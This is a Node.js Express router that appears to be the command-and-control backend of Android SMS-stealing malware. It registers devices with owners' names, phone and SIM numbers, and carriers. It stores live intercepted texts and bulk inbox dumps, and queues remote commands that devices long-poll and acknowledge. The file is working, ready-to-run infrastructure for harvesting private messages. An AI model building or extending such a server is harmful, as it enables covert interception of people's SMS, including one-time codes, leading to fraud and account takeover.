const express = require('express');
const { v4: uuidv4 } = require('uuid');
const { query, queryOne, run } = require('../db');

const router = express.Router();

function n(v) { return v === undefined ? null : v; }

router.post('/register', (req, res) => {
  const b = req.body;
  const deviceId = b.deviceId;

  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId is required' });
  }

  const existing = queryOne('SELECT id FROM devices WHERE deviceId = ?', [deviceId]);
  const now = new Date().toISOString();

  if (existing) {
    run(`UPDATE devices SET
      userName = ?, mobileNumber = ?, sim1Number = ?, sim1Carrier = ?,
      sim2Number = ?, sim2Carrier = ?, deviceModel = ?, androidVersion = ?,
      sdkVersion = ?, brand = ?, screenRes = ?, operator = ?,
      batteryLevel = ?, networkType = ?, lastSeen = ?
      WHERE deviceId = ?`,
      [n(b.userName), n(b.mobileNumber), n(b.sim1Number), n(b.sim1Carrier),
       n(b.sim2Number), n(b.sim2Carrier), n(b.deviceModel), n(b.androidVersion),
       n(b.sdkVersion), n(b.brand), n(b.screenRes), n(b.operator),
       n(b.batteryLevel), n(b.networkType), now, deviceId]);

    const device = queryOne('SELECT * FROM devices WHERE deviceId = ?', [deviceId]);
    return res.json(device);
  }

  const id = uuidv4();
  run(`INSERT INTO devices (id, deviceId, userName, mobileNumber, sim1Number, sim1Carrier, sim2Number, sim2Carrier, deviceModel, androidVersion, sdkVersion, brand, screenRes, operator, batteryLevel, networkType, lastSeen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [id, deviceId, n(b.userName), n(b.mobileNumber), n(b.sim1Number), n(b.sim1Carrier),
     n(b.sim2Number), n(b.sim2Carrier), n(b.deviceModel), n(b.androidVersion),
     n(b.sdkVersion), n(b.brand), n(b.screenRes), n(b.operator),
     n(b.batteryLevel), n(b.networkType), now]);

  const device = queryOne('SELECT * FROM devices WHERE deviceId = ?', [deviceId]);
  res.status(201).json(device);
});

router.put('/register', (req, res) => {
  const b = req.body;
  const deviceId = b.deviceId;

  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId is required' });
  }

  const now = new Date().toISOString();
  run(`UPDATE devices SET
    userName = ?, mobileNumber = ?, sim1Number = ?, sim1Carrier = ?,
    sim2Number = ?, sim2Carrier = ?, deviceModel = ?, androidVersion = ?,
    lastSeen = ?
    WHERE deviceId = ?`,
    [n(b.userName), n(b.mobileNumber), n(b.sim1Number), n(b.sim1Carrier),
     n(b.sim2Number), n(b.sim2Carrier), n(b.deviceModel), n(b.androidVersion),
     now, deviceId]);

  const device = queryOne('SELECT * FROM devices WHERE deviceId = ?', [deviceId]);
  res.json(device || { deviceId });
});

router.post('/sms-live', (req, res) => {
  const { deviceId, address, body, smsDate } = req.body;

  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId is required' });
  }

  const id = uuidv4();
  run('INSERT INTO sms_messages (id, deviceId, direction, address, body, smsDate) VALUES (?, ?, \'live\', ?, ?, ?)',
    [id, deviceId, address, body, smsDate || new Date().toISOString()]);

  res.status(201).json({ id, deviceId, direction: 'live', address, body, smsDate, createdAt: new Date().toISOString() });
});

router.post('/sms', (req, res) => {
  const { deviceId, messages } = req.body;

  if (!deviceId || !messages || !Array.isArray(messages)) {
    return res.status(400).json({ error: 'deviceId and messages array required' });
  }

  const results = [];
  for (const msg of messages) {
    const id = uuidv4();
    run('INSERT INTO sms_messages (id, deviceId, direction, address, body, smsDate) VALUES (?, ?, \'inbox\', ?, ?, ?)',
      [id, deviceId, msg.address || '', msg.body || '', msg.date || '']);
    results.push({ id, deviceId, direction: 'inbox', address: msg.address, body: msg.body, smsDate: msg.date });
  }

  res.status(201).json(results);
});

router.get('/commands', (req, res) => {
  const { deviceId, wait } = req.query;
  const maxWait = Math.min(parseInt(wait) || 0, 30);

  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId is required' });
  }

  run('UPDATE devices SET lastSeen = ? WHERE deviceId = ?', [new Date().toISOString(), deviceId]);

  const pollCommands = () => {
    const commands = query('SELECT * FROM commands WHERE deviceId = ? AND status = \'pending\' ORDER BY createdAt ASC', [deviceId]);

    if (commands.length > 0) {
      return res.json(commands);
    }

    if (maxWait > 0) {
      setTimeout(() => {
        const retry = query('SELECT * FROM commands WHERE deviceId = ? AND status = \'pending\' ORDER BY createdAt ASC', [deviceId]);
        res.json(retry);
      }, maxWait * 1000);
    } else {
      res.json([]);
    }
  };

  pollCommands();
});

router.post('/commands/:id/ack', (req, res) => {
  const { id } = req.params;
  run('UPDATE commands SET status = \'acknowledged\', acknowledgedAt = ? WHERE id = ?', [new Date().toISOString(), id]);
  res.json({ success: true });
});

module.exports = router;
